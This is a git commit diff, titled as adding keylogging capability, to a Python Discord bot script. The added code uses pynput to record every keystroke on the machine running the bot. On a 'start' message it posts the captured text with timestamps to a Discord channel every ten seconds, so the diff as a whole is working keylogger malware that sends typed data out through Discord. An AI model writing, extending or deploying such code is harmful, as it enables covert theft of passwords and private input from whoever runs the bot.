5721ade016177842be0b89bb0c199491bd709de0
man-hq <125324132+man-hq@users.noreply.github.com>
2025-10-05 23:59:52 -0700

    (feat) add keylogging capability

--- bot_hello.py
+++ bot_hello.py
@@ -1,10 +1,12 @@
 import os, asyncio
 from dotenv import load_dotenv
 import discord
+import time
 from discord.ext import commands
 from pynput import keyboard
 
 INTERVAL = 10
+t = ""
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -16,6 +18,7 @@ intents.message_content = True
 bot = discord.Client(intents=intents)
 
 async def countdown(m, channel, flag):
+    listen.start()
     while not flag.is_set():
         msg = await channel.send(f"Countdown: {INTERVAL}s")
         for rem in range(INTERVAL - 1, -1, -1):
@@ -24,15 +27,19 @@ async def countdown(m, channel, flag):
         await msg.edit(content="Done!")
         await pull(channel)
 
-async def end(channel,flag):
+async def stop(channel,flag):
     def check(m):
-        return (m.content == "end")
+        return (m.content == "stop")
     await bot.wait_for("message", check = check)
     flag.set()
+    listen.stop()
     await channel.send("Stopped Listening :3")
 
 async def pull(channel):
-    await channel.send("PULLING THE KEYSTOKES")
+    global t
+    ts = time.strftime("%H:%M:%S")
+    await channel.send(f"{ts}: {t}")
+    t=""
 
 @bot.event
 async def on_message(message):
@@ -40,13 +47,21 @@ async def on_message(message):
         return
     m = message.content
 
-    if m == "start":
+    if m == "start":     
         flag = asyncio.Event()
-        asyncio.create_task(end(message.channel,flag))
+        asyncio.create_task(stop(message.channel,flag))
         asyncio.create_task(countdown(m,message.channel, flag))
-
     elif m == "bye bye":
         await bot.close()    
-    
+
+def on_press(key):
+    global t
+    try:
+        t += key.char or ""
+    except AttributeError:
+        t += {"space": " ", "enter": "\n"}.get(getattr(key, "name", ""), f"[{getattr(key, 'name', key)}]")
+
+listen = keyboard.Listener(on_press=on_press)
+
 if __name__ == "__main__":
     bot.run(TOKEN)
